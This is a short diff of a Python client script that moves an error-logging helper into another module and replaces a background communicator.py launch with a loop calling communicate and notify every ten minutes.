@@ -1,25 +1,12 @@
-from helpers import getMacVer, getLinuxVer, getWindowsVer, getChromium, getFirefox
+from helpers import getMacVer, getLinuxVer, getWindowsVer, getChromium, getFirefox, notify, onFail
+from communicator import communicate
 import socket
 import platform
 import os
 import subprocess
 import json
 import random
-
-
-def onFail(err_msg, critical=False, silent=False):
-    if not silent:
-        print("[FAIL]")
-    try:
-        f = open("errors.log", 'w')
-        f.write(str(err_msg))
-        f.close()
-    except Exception:
-        critical = True
-
-    if critical:
-        print("Critical Error! Exiting...")
-        exit(0)
+import time
 
 
 def firstRun():
@@ -136,7 +123,10 @@ def main():
     except Exception as e:
         onFail(e)
 
-    subprocess.Popen(["python3", "communicator.py", unique, "&"])
+    while True:
+        communicate(unique)
+        notify(oper)
+        time.sleep(600)
 
 
 if __name__ == '__main__':
